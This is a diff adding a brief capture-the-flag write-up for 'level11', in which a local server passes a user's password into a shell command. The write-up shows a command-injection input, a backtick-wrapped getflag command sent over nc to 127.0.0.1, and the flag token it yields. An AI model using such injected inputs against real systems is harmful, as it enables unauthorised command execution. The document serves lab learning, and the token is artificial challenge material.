@@ -1,0 +1,11 @@
+In this level there is a server running that takes a password and checks if it matches the hash for flag11. But it does this by running "echo "..pass.." | sha1sum" and substituting "pass" with the password. We bypass the sha1sum by injecting the getflag into the command with back ticks:
+
+nc 127.0.0.1 5151
+Password: `getflag > /tmp/level11.txt`
+Erf nope...
+
+The result in /tmp/level11.txt is:
+
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
+There is no password for flag11.
